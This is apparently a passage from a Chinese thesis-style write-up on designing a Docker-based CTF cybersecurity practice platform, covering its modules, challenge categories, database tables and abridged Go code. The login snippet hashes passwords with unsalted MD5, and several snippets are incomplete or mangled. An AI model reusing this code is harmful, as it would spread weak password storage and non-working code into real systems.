Plus+Go+MySQL的架构。前端采用Vue3框架，后端则使用Gin框架进行设计开发。同时使用Gorm技术链接数据库，管理系统数据，单独开启一个线程使用Redis作为存入数据库的缓冲。在Web和PWN题目中采用部署在远程服务器上的Docker容器作为题目环境，借助Go语言对Docker操作的便利性实现服务器中Docker实例。</p><h4 id="3-1-总体设计">3.1 总体设计</h4><p>​网络安全实验平台由管理员单元、用户单元和通用单元三部分组成。管理员单元的功能主要包括部署新的题目容器、用户管理、文章管理和公告发布等功能。用户单元的功能主要包括注册账号、个人信息维护、在练习场申请实验容器、提交解题思路和发表文章等。通用单元包括排行榜、文章上传和登录注册等功能。此外实验平台后端还负责管理各项用户与平台交互产生的信息、实验容器的分发和回收、与数据库交互以维护平台信息。系统模块功能如图3-1所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps3.jpg" style="zoom: 80%;" /><center>图3-1 平台模块图</center>系统采用了分层架构和MVC模式的架构，如图3-2所示<img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps4.png" style="zoom: 80%;" /><center>图3-2 系统架构图</center>#### 3.2 详细设计<h5 id="3-2-1-登录注册模块设计">3.2.1 登录注册模块设计</h5><p>​由于实验平台实际需要，管理员用户为直接写入数据库，通过注册模块注册的用户均为普通用户。当用户访问实验平台时，可以通过主页引导进入登录页面。用户登录时，系统验证用户名和凭据是否匹配数据库信息，匹配则登录成功，否则返回错误提示。用户登录注册模块的具体流程如图3-3所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps5.png" style="zoom:60%;" /><center>图3-3 登录注册模块流程图</center>### 3.2.2 管理员功能模块<p>（1）发布公告功能</p><p>​系统使用wangeditor框架的富文本模块进行开发，并且支持代码高亮，字体格式编辑，插入表格，背景色等功能。管理员发布公告后，将会将数据存入数据库Notices表中，并将公告展示在主页中。</p><p>（2）文章管理</p><p>​管理员可以对平台的文章进行搜索、查看、修改、删除等操作。当用户上传文章后，管理员查看用户上传的文章，选择是否发布该文章，并可以设置推荐文章。当文章被设置为推荐文章后，将在平台主页进行展示。文章管理模块的流程如图3-4所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps6.png" style="zoom: 80%;" /><center>图3-4 文章发布流程图</center>​题目管理：管理员端的题目管理包括题目上传及题目管理两部分，题目上传，暨上传题目到实验平台，题目管理可以查看平台目前已有的所有题目信息，并对其修改，删除。由于练习场中部分题目涉及容器模块，题目管理下还包括容器管理部分。由于云服务器依旧空间有限，管理员可以在必要时强行关闭客户开启的靶机容器。题目部署流程如图3-5所示。<img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps7.png" style="zoom:80%;" /><center>图3-5 题目部署流程图</center>​用户管理：管理员可以对用户信息进行操作，包括修改用户信息，重置密码，将用户从数据库中删除等操作，当管理员发现用户积分异常变化时，可以将用户成绩在成绩排行榜中屏蔽。<h3 id="3-2-3-用户功能">3.2.3 用户功能</h3><p>​个人信息：用户可以通过个人中心查看、修改个人信息及密码。同时平台统计的各种信息也会展示在用户个人信息中，包括用户知识结构等内容。</p><p>​文章功能：个人用户和管理员用户均可以发布文章。普通用户发布的文章会直接存入数据库中，但是只有经过管理员审核后批准的才会展示在主页。同时个人用户可以通过个人中心查看自己发布的文章并对其进行修改。在文章模块中用户可以通过关键字进行搜索查看带有该关键字的文章。</p><h3 id="3-2-4-练习场及题目设计">3.2.4 练习场及题目设计</h3><p>​主要题目类型包含Web 网络安全、Re 逆向工程、Pwn 二进制漏洞利用、Crypto密码攻击、Mobile 移动安全以及Misc安全杂项等^[10]^，这些内容暨GB/T 42446-2023中K01-003网络安全基础知识及K05-003网络安全威胁和漏洞管理，K05-005渗透测试技术与方法，K05-006网络攻防技术等知识^[11]^。</p><p>​在本实验平台中，练习场题目分为两种类型，附件型和容器型，附件型题目包括逆向工程、安全杂项、密码学、移动安全等，容器型包括二进制安全和Web安全。用户可以在练习场中进行实验操作，在附件型题目中，用户需要下载附件并在本地解答题目，得到题目Flag之后提交到平台进行验证。在容器型题目中，用户需要申请实验容器、在下发的容器地址中得到题目答案，通过平台提交答案及解题思路等。练习场解题流程如图3-6所示。</p><p><img src="D:%5Cblog%5Cshierjinghuang%5Csource_posts%5C%E5%9F%BA%E4%BA%8EDocker%E5%AE%B9%E5%99%A8%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%5Cwps8.png" alt="img"></p><center>图3-6 解题流程图</center>​逆向工程Re和二进制安全Pwn两种题目，这两类题目考察参赛者发现和利用软件漏洞的能力。需要解题者具备一定的编程能力和软件测试能力。解题者通过反编译技术将应用程序恢复为伪代码形式，在此基础上分析程序的行为，包括函数逻辑和数据处理流程。以求找到程序中隐藏的漏洞并对其进行利用，来获取必要的系统权限或者窃取敏感信息。<p>​移动安全Mobile是近期备受关注的一个领域，涉及到移动应用程序的安全漏洞甚至移动端系统层漏洞及相应攻防技术。这一类题目可以被视为是逆向工程和二进制安全在移动平台上综合应用。在这类CTF赛题中包括了Android和iOS等平台上的应用程序分析、反编译、漏洞利用等内容。参赛者需要了解移动应用程序的工作原理、移动系统的工作原理以及常见的安全漏洞，并能够对其进行复现和利用。</p><p>​Crypto密码攻击起源于密码学的密码编码学与密码分析学的实际应用，是网络安全领域中的重要分支，涉及到密码学的理论和实践。CTF赛题中的密码学题目包括了从古典密码到非对称加密、国密算法等多个方面的内容，参与者需要运用数学知识和密码学算法来破解加密算法并解密密文。</p><p>​安全杂项Misc，涵盖了各种与安全相关的各种内容，如电子取证、网络协议分析、社会工程学攻击、隐写术等。网络安全题目类别图如图3-7所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps9.jpg" style="zoom: 80%;" /><center>图3-7 网络安全题目分类</center>#### 3.3 数据库设计<h5 id="3-3-1-概念结构设计">3.3.1 概念结构设计</h5><p>​通过系统的需求分析，进行数据抽象，抽象出用户实体、文章实体、题目实体、公告实体、镜像实体和容器实体等六个实体。</p><p>​文章实体的属性包括文章ID、文章标题、文章类型、文章内容、作者、创建时间和浏览量等，文章实体的E-R图如图3-8所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps10.png" style="zoom:80%;" /><center>图3-8 文章实体E-R图</center>​用户实体的属性包括用户ID、账号、邮箱、昵称、密码、积分、签名、创建时间、更新时间和权限等，用户实体的E-R图如图3-9所示。<p>​题目实体的属性包括题目ID、问题名、问题描述、问题类型、分值、问题提示、答案、创建时间、更新时间动态答案标志和题目首通用户等，题目实体的E-R图如图3-10所示。</p><p><img src="D:%5Cblog%5Cshierjinghuang%5Csource_posts%5C%E5%9F%BA%E4%BA%8EDocker%E5%AE%B9%E5%99%A8%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%5Cwps11.png" alt="img"></p><center>图3-9 用户实体E-R图</center><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps12.png" style="zoom:80%;" /><center>图3-10 题目实体E-R图</center>​公告实体的属性包括公告ID、标题、作者、公告内容、创建时间和更新时间等，公告实体的E-R图如图3-11所示。<img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps13.png" style="zoom:80%;" /><center>图3-11 公告实体 E-R图</center>​镜像实体的属性包括镜像ID、仓库名称、创建时间和更新时间等，镜像实体的E-R图如图3-12所示。<p>​容器实体的属性包括容器ID、容器名称、容器状态、仓库名称、启动端口、映像端口、剩余时间、创建时间和更新时间等，镜像实体的E-R图如图3-13所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps14.png" style="zoom:80%;" /><center>图3-12 镜像实体 E-R图</center><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps15.png" style="zoom: 80%;" /><center>图3-13 容器实体E-R图</center>​用户发布文章和公告，为一对多的联系，同时用户解答题目为多对多的联系。在部分设计镜像的题目中，系统会由题目的附件构建Docker Image，题目与镜像为一对一的联系。通过一个镜像可以构建多个容器，表现为一对多的联系。数据库全局E-R图如图3-14所示<p><img src="D:%5Cblog%5Cshierjinghuang%5Csource_posts%5C%E5%9F%BA%E4%BA%8EDocker%E5%AE%B9%E5%99%A8%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%5Cwps16.png" alt=""></p><center>图3-14 数据库全局E-R图</center>### 3.3.2 逻辑结构设计<p>​在逻辑结构设计中，将概念结构设计阶段得到的E-R图转换为关系模式，本系统转换的各关系模式如下。</p><p><strong>（1）用户关系 Computer_Users</strong></p><p>​用户关系Computer_Users主要存放了系统用户的相关信息，其中id为主键。系统用户包括管理员用户和普通用户，使用Permissions位区分两类用户，Permissions值为1表示为管理员，0位普通用户。Password中并未存放实际用户密码，而是存放密码经过加密后的散列值，详情如表3-1所示。</p><center>表3-1 用户数据表 Computer_Users </center>| 列名         | 数据类型      | null | 默认 | 说明               || ------------ | ------------- | ---- | ---- | ------------------ || id           | int           | 否   |      | 主键，用于区分用户 || Number       | varchar (255) | 否   |      | 账号               || Email        | varchar (25)  | 否   |      | 邮箱               || Nick_Name    | varchar (25)  | 是   |      | 昵称               || Password     | varchar (255) | 否   |      | 密码               || Autograph    | varchar (255) | 是   | 0    | 签名               || Integral     | int           | 否   |      | 积分               || Create_Time  | datetime      | 否   |      | 创建时间           || Updated_Time | datetime      | 是   | 0    | 更新时间           |<p><strong>（2）题目关系 Problems</strong></p><p>​题目关系Problem主要用来存放题目信息，其中包括题目序号、名称、正确答案、问题通过次数、问题提交次数等信息。其中ID是本表的主键。Problem_A_Blood_Id为题目首通用户ID，同时用来标识题目是否有人通过和首通用户。Flag_Bool为题目动态答案标志，默认为0，即固定答案，当Flag_Bool为1表示为动态答案。详细信息如表3-2所示。</p><center>表3-2 题目信息表 Problems</center>| 列名               | 数据类型      | null | 默认             | 说明               || ------------------ | ------------- | ---- | ---------------- | ------------------ || id                 | int           | 否   |                  | 主键，用于区分题目 || Problem_Name       | varchar (255) | 否   |                  | 问题名             || Describe           | varchar (255) | 否   |                  | 问题描述           || Problem_Type       | varchar (255) | 否   | 200              | 问题类型           || Score              | varchar (255) | 是   |                  | 分值               || Tips               | varchar (255) | 是   |                  | 问题提示           || Answer             | varchar (255) | 否   |                  | 答案               || Problem_A_Blood_Id | varchar (255) | 否   | 0                | 题目首通用户ID     || Flag_Bool          | varchar (255) | 是   | flag{xxxxxxxxxx} | 动态答案标志       || Create_Time        | datetime      | 否   |                  | 创建时间           || Updated_Time       | datetime      | 是   |                  | 更新时间           |<p>（3）公告关系 Notices</p><p>​公告关系Notices主要用来存放公告信息，其中包括公告和其内容。其中序号ID是本表的主键。由于使用了Wangeditor框架开发，通过json流将带有标签和样式的信息存入Content中。其中序号ID是本表的主键。其详细信息如表3-3所示。</p><center>表3-3 公告信息表 Notices</center>| 列名         | 数据类型     | null | 默认  | 说明               || ------------ | ------------ | ---- | ----- | ------------------ || id           | int          | 否   |       | 主键，用于区分公告 || Title        | varchar (25) | 否   | Admin | 公共名             || Author       | varchar (25) | 是   |       | 作者               || Content      | text         | 否   |       | 内容               || Create_Time  | datetime     | 否   |       | 创建时间           || Updated_Time | datetime     | 是   |       | 更新时间           || User_ID      | int          | 否   |       | 用户ID，外键       |<p>（4）文章关系 Articles</p><p>​文章关系 Articles用来存放文章信息，包括文章的标题、文章类型、作者、内容等信息，其中序号ID是本表的主键。借助Wangeditor框架通过json流将带有标签和样式的信息存入Content中。Recommend的值初始为0为对应文章的浏览量。详细信息如表3-4所示。</p><center>表3-4 文章信息表 Articles</center>| 列名      | 数据类型      | null | 默认 | 说明               || --------- | ------------- | ---- | ---- | ------------------ || id        | int           | 否   |      | 主键，用于识别文章 || Title     | varchar (255) | 否   |      | 标题               || News_Type | varchar (25)  | 是   |      | 文章类型           || Author    | varchar (25)  | 是   |      | 作者               || Content   | text          | 是   |      | 文章内容           || Time      | datetime      | 否   | 0    | 创建时间           || Recommend | int           | 是   |      | 浏览量             || User_ID   | int           | 否   |      | 用户ID，外键       |<p>（5）解题关系 Submit_Problems</p><p>​解题信息表 Submit_Problems主要用来存放解题记录。其中序号ID是本表的主键，通过User_ID在Computer_Users表中唯一确定一个用户，Problem_ID绑定Problems中的Display，实现唯一对应一道题目，实现用户解题历史的记录。Problem_Submit_Number为提交次数，Problem_Pass为验证，默认为0表示题目还未通过，当值为1时即用户解题成功。通过对表中各条记录的统计可以得到对应题目的提交次数与通过次数。其详细信息如表3-5所示。</p><center>表3-5 解题信息表 Submit_Problems</center>| 列名                  | 数据类型      | null | 默认 | 说明         || --------------------- | ------------- | ---- | ---- | ------------ || id                    | int           | 否   |      | 主键，自增   || User_Id               | int           | 否   |      | 用户ID，外键 || Problem_Id            | int           | 否   |      | 题目ID，外键 || Problem_Submit_Number | varchar (255) | 否   | 1    | 提交次数     || Problem_Pass          | varchar (255) | 否   | 0    | 是否通过     || Create_Time           | datetime      | 否   |      | 创建时间     || Updated_Time          | datetime      | 是   |      | 更新时间     |<p>（6）镜像关系 Image</p><p>​镜像信息表Image用于存放服务器中的镜像信息，id为其主键，Image_Id为镜像的id，Repository为仓库名称，使用组合式写法即Repository:Tag形式，Problem_Id负责与对应题目绑定。</p><center>表3-6 镜像信息表 Image</center>| 列名         | 数据类型      | null | 默认 | 说明         || ------------ | ------------- | ---- | ---- | ------------ || Image_Id     | int           | 否   |      | 镜像ID       || Repository   | varchar (255) | 否   |      | 仓库名称     || Create_Time  | datetime      | 否   |      | 创建时间     || Updated_Time | datetime      | 是   |      | 更新时间     || Problem_Id   | int           | 否   |      | 题目ID，外键 |<p>（7）容器关系 Docker_information</p><p>​容器关系Docker_information主要用于存放当前启动的容器的相关信息，Docker_ID为主键。Container_Port为服务器对外开放的端口，Port为容器开放端口，实际是要将容器的80端口映射到服务器对外开放的端口上。Container_Status，为容器状态，0表示容器停止，1表示容器正在启动，2为未知状态。Repository为仓库名称，使用组合式写法即Repository:Tag形式，Remaining_time为容器剩余时间，默认为60分钟，用户延时后剩余时间会对应增加。容器信息表详细信息如表3-7所示。</p><center>表3-7 容器信息表 Docker_information</center>| 列名 | 数据类型 | null | 默认 | 说明 || ---- | -------- | ---- | ---- | ---- ||      |          |      |      |      |<h3 id="4-系统实现">4 系统实现</h3><h4 id="4-1-系统登录与注册模块实现">4.1 系统登录与注册模块实现</h4><h5 id="4-1-1-用户登录模块实现">4.1.1 用户登录模块实现</h5><p>​平台在用户没有登录时大部分功能无法正常使用。当点击Header栏登录按钮，会打开登录界面。输入账号并点击继续后，系统会检查账号是否存在。不存在则跳转注册页面，存在则输入密码并在后端进行验证。如果数据库中存在相应用户信息，且密码准确，将登录进入主界面，反之将出现密码错误的弹窗。登录页面如图4-1所示。</p><p>关键代码如下：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> Innumber <span class="token punctuation">(</span>db <span class="token operator">*</span>gorm<span class="token punctuation">.</span>DB<span class="token punctuation">,</span> str <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> user model<span class="token punctuation">.</span> ComputerUser  db<span class="token punctuation">.</span> Where <span class="token punctuation">(</span><span class="token string">"number=?"</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token function">Find</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token builtin">len</span> <span class="token punctuation">(</span>user<span class="token punctuation">.</span> Number<span class="token punctuation">)</span><span class="token operator">!</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> Check <span class="token punctuation">(</span>content<span class="token punctuation">,</span> encrypted <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> strings<span class="token punctuation">.</span> EqualFold <span class="token punctuation">(</span><span class="token function">Encode</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> encrypted<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> Encode <span class="token punctuation">(</span>data <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>  h<span class="token punctuation">:</span> <span class="token operator">=</span> md5<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  h<span class="token punctuation">.</span> Write <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">byte</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> hex<span class="token punctuation">.</span> EncodeToString <span class="token punctuation">(</span>h<span class="token punctuation">.</span> <span class="token function">Sum</span><span class="token punctuation">(</span><span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps17.jpg" style="zoom:80%;" /><center>图4-1系统登录界面</center>##### 4.1.2 注册页面实现<p>​当点击注册按钮，将跳转到注册页面，通过平台注册界面注册的用户，其Computer_Users表中的Permissions值均为0，为普通用户。对输入数据前端及后端均会进行验证，避免平台数据库受到攻击。用户注册模块页面如图4-2所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps18.jpg" style="zoom:80%;" /><center>图4-2 用户注册界面</center>用户关键代码如下：<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> Register <span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span> Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  DB<span class="token punctuation">:</span> <span class="token operator">=</span> common<span class="token punctuation">.</span> GetDB <span class="token punctuation">(</span><span class="token punctuation">)</span>  json<span class="token punctuation">:</span> <span class="token operator">=</span> Username <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  c<span class="token punctuation">.</span><span class="token function">BindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>json<span class="token punctuation">)</span>  md<span class="token punctuation">:</span> <span class="token operator">=</span> Encode <span class="token punctuation">(</span>json<span class="token punctuation">.</span> Password<span class="token punctuation">)</span>  DB<span class="token punctuation">.</span> <span class="token function">Create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>newUser<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-2-用户功能模块实现">4.2 用户功能模块实现</h4><p>​用户登录后的主页如下图所示，前台会展示管理员选择推荐的文章，和管理员发布的公告。同时用户可以通过主页访问练习场模块和排行榜模块。点击左上角的头像按钮将弹出下拉菜单，普通用户可以由此进入个人中心和文章模块。管理员用户的下拉菜单有所不同，其下拉菜单中包含后台选项，管理员用户可以由此进入系统后台。平台为保证用户有能力解决网络安全相关题目，用户可以通过其他中的访问平台搜集的各种在线工具和资源下载途径。用户主页界面如图4-3所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps19.jpg" style="zoom: 80%;" /><center>图4-3用户主页界面</center>##### 4.2.1 练习场模块的实现<p>​此模块在未登录时仅显示题目列表，用户点击不会触发点击事件，无法解答题目，用户在登录后才可以正常解答题目。当用户进入练习场后，可以通过左侧菜单栏按照类别题目类型，右侧会动态展示相应类型的题目。用户点击进入想要解答的题目，之后按照题目要求选择下发靶机环境或者下载附件。当解答完成后，用户将从附件或容器中获取到Flag提交，如果结果正确将显示提交正确，并为账号添加相应题目的分值。在用户不再尝试解题时可以点击按钮关闭当前已下发的靶场环境，后台会自动强制关闭该题目对应容器。题目列表会显示题目的通过人数和提交次数。用户解题成功后会使用红色标注，对于已通过的题目再次解题将不再得分。页面具体展示如图4-4所示。</p><p>​对于需要启动Docker的题目其流程如下所示：点击下发容器后，系统后台会下发相应容器，容器有一定运行时间限制。当容器运行时间结束时，会提示是否进行延时，如果不进行延时，系统会自动回收Docker容器，如果选择延时，系统将会延长Docker容器的运行时间。同时一个用户只能同时启动一个容器，如果需要启动其他题目，则需要先点击销毁容器，系统会回收相应容器资源。完成解题后将获取到flag后提交，如果结果正确将显示提交正确，并为账号添加相应题目的分数，同时系统会销毁容器并回收相应资源。靶机启动前后如图4-5所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps20.jpg"  /> <center> 图4-4练习场界面</center><center><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps21.jpg"  /> <img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps22-1743418602816.jpg"  /><center><center>图4-5 Web题目启动前后对比图</center>​由于本地环境的限制，包括存储与计算资源、网络连接以及安全要求等方面的限制，将Docker容器放在本地并不现实。因此为满足平台不断变化需求的需要，更便捷地部署和管理Docker容器，选择将Dockerfile及由此经过构建并运行的Docker Container部署在云服务器上。<p>​本系统在实际实现的过程中将Docker相关内容部署到阿里云服务器上。当前端用户点击下发容器后，后端将相关操作发送给服务器，进而对Docker容器进行操作。容器的下发与回收如图4-6所示。</p><p><strong>容器创建的关键代码如下：</strong></p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">CreateAndStartContainer</span><span class="token punctuation">(</span>g <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  createImage <span class="token operator">:=</span> request<span class="token punctuation">.</span>CreateImageRequest<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  err <span class="token operator">:=</span> g<span class="token punctuation">.</span><span class="token function">ShouldBindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>createImage<span class="token punctuation">)</span>  data<span class="token punctuation">,</span> ok <span class="token operator">:=</span> util<span class="token punctuation">.</span><span class="token function">VerifyPermissions</span><span class="token punctuation">(</span>createImage<span class="token punctuation">.</span>Token<span class="token punctuation">,</span> g<span class="token punctuation">)</span>  uid<span class="token punctuation">,</span> exists <span class="token operator">:=</span> data<span class="token punctuation">[</span><span class="token string">"uid"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span>  username<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span>  createImage<span class="token punctuation">.</span>UserId <span class="token operator">=</span> uid  createImage<span class="token punctuation">.</span>Username <span class="token operator">=</span> username  containerManager<span class="token punctuation">,</span> err <span class="token operator">:=</span> common<span class="token punctuation">.</span><span class="token function">NewContainerManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​在具体实现过程中，即通过前端点击触发后端接口进而通过云服务器创建容器，并将容器的80端口映射到服务器的开放端口。由于阿里云服务器自带防火墙，会隔绝外部访问，所以需要进行安全组管理，将接口池的30080端口到30880端口设置为测试端口，允许外部IP地址访问。在容器下发完成后，平台用户访问对应题目，即访问远程服务器开放端口。</p><center> <img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps23.png" style="zoom: 80%;" /></center><center>图4-6容器的下发与回收</center>##### 4.2.2 文章模块的实现<p>​用户端的文章模块，管理员和用户可以将自己认为有价值的内容上传，也可是上传平台题目解题思路，同时前台将进行展示。文章模块提供搜索功能，可以检索带有关键字的文章。文章模块如图4-7所示。</p><p>​同时文章模块可以根据Articles库中的id值，将存储在Articles表中的文章信息映射到对应的Article:id页面，进行展示。由于在文章发布模块使用WangEditor，通过json流将带有标签和样式的信息存入Content中。对应文章页面的实现过程与存入过程正好相反，通过json数据流读出数据库Content中的标签及样式信息，写入前端Vue文件中，并对其进行动态渲染，从而实现对应文章的展示。</p><p><strong>关键代码如下：</strong></p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// FindArticle 查询文章</span><span class="token keyword">func</span> FindArticle <span class="token punctuation">(</span>f <span class="token operator">*</span>gin<span class="token punctuation">.</span> Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  DB<span class="token punctuation">:</span> <span class="token operator">=</span> common<span class="token punctuation">.</span> GetDB <span class="token punctuation">(</span><span class="token punctuation">)</span>  title<span class="token punctuation">,</span> <span class="token boolean">_</span><span class="token punctuation">:</span> <span class="token operator">=</span> f<span class="token punctuation">.</span> <span class="token function">GetQuery</span><span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">)</span>  <span class="token keyword">var</span> cat <span class="token punctuation">[</span><span class="token punctuation">]</span> model<span class="token punctuation">.</span> Article  DB<span class="token punctuation">.</span> Where <span class="token punctuation">(</span><span class="token string">"title LIKE?"</span><span class="token punctuation">,</span> <span class="token string">"%"</span><span class="token operator">+</span>title<span class="token operator">+</span><span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token function">Find</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cat<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps24.jpg" style="zoom:80%;" /><center>图4-7文章模块实现</center>#### 4.3 管理员功能模块实现<p>​安全是“三分技术，七分管理”，网络安全实验平台的长期安全运营，也需要经过实践的检验。系统中管理员功能主要职责为维护网络安全实验平台的正常运行，主要实现信息发布，用户信息管理、文章管理、题目管理、容器管理等功能。</p><h5 id="4-3-1-用户信息管理的实现">4.3.1 用户信息管理的实现</h5><p>​在该系统后台中管理员不仅可以管理用户账号和用户信息，还能对用户的个人账户密码进行更改，从而保证了系统的正常运行。在特点情况下可以删除用户，如图4-8所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps25.jpg" style="zoom:80%;" /><center>图4-8用户信息管理页面</center>##### 4.3.2 文章管理模块的实现<p>​文章管理功能，包括文章信息管理和文章发布及公共发布，文章发布功能使用wangeditor框架的富文本模块进行开发，将管理员在前端输入内容与样式作为整体存入数据库，文章信息管理则与前面的用户信息管理内容相似。题目上传页面具体内容如图4-9所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps26.jpg" style="zoom:80%;" /><center>图4-9 题目上传页面</center>题目上传代码如下所示：<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> ProblemUpload <span class="token punctuation">(</span>p <span class="token operator">*</span>gin<span class="token punctuation">.</span> Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  DB<span class="token punctuation">:</span> <span class="token operator">=</span> common<span class="token punctuation">.</span> GetDB <span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">var</span> Pr model<span class="token punctuation">.</span> Problem  DB<span class="token punctuation">.</span> Where <span class="token punctuation">(</span><span class="token string">"display=?"</span><span class="token punctuation">,</span> Display<span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token function">Find</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Pr<span class="token punctuation">)</span>  DB<span class="token punctuation">.</span> <span class="token function">Create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>NewProblem<span class="token punctuation">)</span>  url<span class="token punctuation">:</span> <span class="token operator">=</span> “<span class="token punctuation">.</span> <span class="token operator">/</span>data<span class="token operator">/</span>file<span class="token operator">/</span><span class="token string">" + ProblemType + "</span><span class="token operator">/</span><span class="token string">"  err: = os. MkdirAll (url, os. ModePerm)  file, _: = p. FormFile("</span>file<span class="token string">")  fileStr: = file. Filename  for j: = len(fileStr); j > 0; j-- &#123;     if fileStr[j-1] == '.' &#123;       str: = fileStr[j:]         fe: = Display + "</span><span class="token punctuation">.</span>" <span class="token operator">+</span> str         p<span class="token punctuation">.</span> SaveUploadedFile <span class="token punctuation">(</span>file<span class="token punctuation">,</span> url<span class="token operator">+</span>fe<span class="token punctuation">)</span>         <span class="token keyword">return</span>     <span 